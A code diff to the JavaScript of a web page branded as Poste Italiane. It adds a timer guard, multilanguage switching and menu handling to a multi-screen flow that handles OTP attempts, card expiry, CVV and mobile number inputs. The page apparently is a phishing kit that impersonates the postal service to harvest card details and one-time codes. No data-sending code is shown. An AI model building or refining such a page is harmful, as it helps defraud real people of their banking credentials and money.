 let otp4Attempts = 0;
 
@@ -591,6 +950,7 @@ window.backToLogin = function() {
 // =========================================================
 function startTimer(elementId, seconds) {
     const el = document.getElementById(elementId);
+    if (!el) return;
     let remaining = seconds;
     if (window['ti_' + elementId]) clearInterval(window['ti_' + elementId]);
     el.textContent = '00:' + String(seconds).padStart(2, '0');
@@ -618,7 +978,7 @@ cardExpiryInput.addEventListener('input', () => {
 });
 
 // =========================================================
-// INPUT RESTRICTIONS (numbers only — no max length limit)
+// INPUT RESTRICTIONS
 // =========================================================
 document.getElementById('mobile').addEventListener('input', function() {
     this.value = this.value.replace(/[^0-9]/g, '');
@@ -644,13 +1004,30 @@ document.getElementById('cardCVV').addEventListener('input', function() {
 // =========================================================
 const langBtn = document.getElementById('languageButton');
 const langMenu = document.getElementById('languageMenu');
+
 langBtn.addEventListener('click', (e) => {
     e.stopPropagation();
     langMenu.classList.toggle('open');
 });
-document.addEventListener('click', () => langMenu.classList.remove('open'));
 
-console.log('✅ Poste Italiane — 12 screens ready (English, OTP unlocked)');
+document.querySelectorAll('.lang-menu button').forEach(btn => {
+    btn.addEventListener('click', () => {
+        const lang = btn.dataset.lang;
+        applyLanguage(lang);
+        langMenu.classList.remove('open');
+    });
+});
+
+document.addEventListener('click', (e) => {
+    if (!e.target.closest('.language-wrap')) {
+        langMenu.classList.remove('open');
+    }
+});
+
+// Apply saved language on load
+applyLanguage(currentLang);
+
+console.log('✅ Poste Italiane — Multilanguage ready');
 </script>
 </body>
 </html>
